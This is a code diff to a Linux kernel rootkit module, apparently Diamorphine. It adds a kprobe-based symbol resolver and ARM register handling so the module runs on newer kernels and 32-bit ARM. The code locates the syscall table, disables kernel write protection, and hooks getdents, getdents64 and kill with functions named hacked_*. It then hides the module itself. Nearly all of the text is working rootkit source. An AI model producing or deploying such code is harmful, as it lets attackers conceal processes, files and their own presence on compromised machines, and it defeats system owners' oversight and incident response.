@@ -34,15 +34,34 @@
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 unsigned long cr0;
 #elif IS_ENABLED(CONFIG_ARM64)
-void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
-unsigned long start_rodata;
-unsigned long init_begin;
+static void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
+static unsigned long start_rodata;
+static unsigned long init_begin;
 #define section_size init_begin - start_rodata
 #elif IS_ENABLED(CONFIG_ARM)
-void (*set_kernel_text_rw)(void);
-void (*set_kernel_text_ro)(void);
+static void (*dia_text_rw)(void);
+static void (*dia_text_ro)(void);
 #endif
 static unsigned long *__sys_call_table;
+#ifdef KPROBE_LOOKUP
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+kallsyms_lookup_name_t kallsyms_lookup_name_ = NULL;
+#endif
+
+unsigned long resolve_sym(char *symbol)
+{
+#ifdef KPROBE_LOOKUP
+    kallsyms_lookup_name_t kallsyms_lookup_name;
+    if (kallsyms_lookup_name_ == NULL) {
+        register_kprobe(&kp);
+        kallsyms_lookup_name_ = (kallsyms_lookup_name_t) kp.addr;
+        unregister_kprobe(&kp);
+    }
+	kallsyms_lookup_name = kallsyms_lookup_name_;
+#endif
+	return kallsyms_lookup_name(symbol);
+}
+
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && IS_ENABLED(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
 	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
 	static t_syscall orig_getdents;
@@ -65,7 +84,7 @@ get_syscall_table_bf(void)
 	unsigned long *syscall_table;
 	
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
-	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+	syscall_table = (unsigned long*)resolve_sym("sys_call_table");
 	return syscall_table;
 #else
 	unsigned long int i;
@@ -114,6 +133,9 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
 #elif IS_ENABLED(CONFIG_ARM64)
 	int fd = (int) pt_regs->regs[0];
 	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
+#elif IS_ENABLED(CONFIG_ARM)
+	int fd = (int) pt_regs->ARM_r0;
+	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->ARM_r1;
 #endif
 	int ret = orig_getdents64(pt_regs), err;
 #else
@@ -180,6 +202,9 @@ static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
 #elif IS_ENABLED(CONFIG_ARM64)
 	int fd = (int) pt_regs->regs[0];
 	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
+#elif IS_ENABLED(CONFIG_ARM)
+	int fd = (int) pt_regs->ARM_r0;
+	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->ARM_r1;
 #endif
 	int ret = orig_getdents(pt_regs), err;
 #else
@@ -303,6 +328,9 @@ hacked_kill(const struct pt_regs *pt_regs)
 #elif IS_ENABLED(CONFIG_ARM64)
 	pid_t pid = (pid_t) pt_regs->regs[0];
 	int sig = (int) pt_regs->regs[1];
+#elif IS_ENABLED(CONFIG_ARM)
+	pid_t pid = (pid_t) pt_regs->ARM_r0;
+	int sig = (int) pt_regs->ARM_r1;
 #endif
 #else
 asmlinkage int
@@ -358,7 +386,10 @@ protect_memory(void)
 	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
 			section_size, PAGE_KERNEL_RO);
 #elif IS_ENABLED(CONFIG_ARM)
-	set_kernel_text_ro();
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 13, 0)
+	if (dia_text_ro)
+		dia_text_ro();
+#endif
 #endif
 }
 
@@ -375,7 +406,10 @@ unprotect_memory(void)
 	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
 			section_size, PAGE_KERNEL);
 #elif IS_ENABLED(CONFIG_ARM)
-	set_kernel_text_rw();
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 13, 0)
+	if (dia_text_rw)
+		dia_text_rw();
+#endif
 #endif
 }
 
@@ -389,12 +423,22 @@ diamorphine_init(void)
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 	cr0 = read_cr0();
 #elif IS_ENABLED(CONFIG_ARM64)
-	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
-	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
-	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
+	update_mapping_prot = (void *)resolve_sym("update_mapping_prot");
+	start_rodata = (unsigned long)resolve_sym("__start_rodata");
+	init_begin = (unsigned long)resolve_sym("__init_begin");
+#if defined(CONFIG_STRICT_KERNEL_RWX)
+	if (!update_mapping_prot || !start_rodata || !init_begin)
+		return -1;
+#endif
 #elif IS_ENABLED(CONFIG_ARM)
-	set_kernel_text_rw = (void *)kallsyms_lookup_name("set_kernel_text_rw");
-	set_kernel_text_ro = (void *)kallsyms_lookup_name("set_kernel_text_ro");
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 13, 0)
+	dia_text_rw = (void *)resolve_sym("set_kernel_text_rw");
+	dia_text_ro = (void *)resolve_sym("set_kernel_text_ro");
+#if defined(CONFIG_STRICT_KERNEL_RWX)
+	if (!dia_text_rw || !dia_text_ro)
+		return -1;
+#endif
+#endif
 #endif
 
 	module_hide();
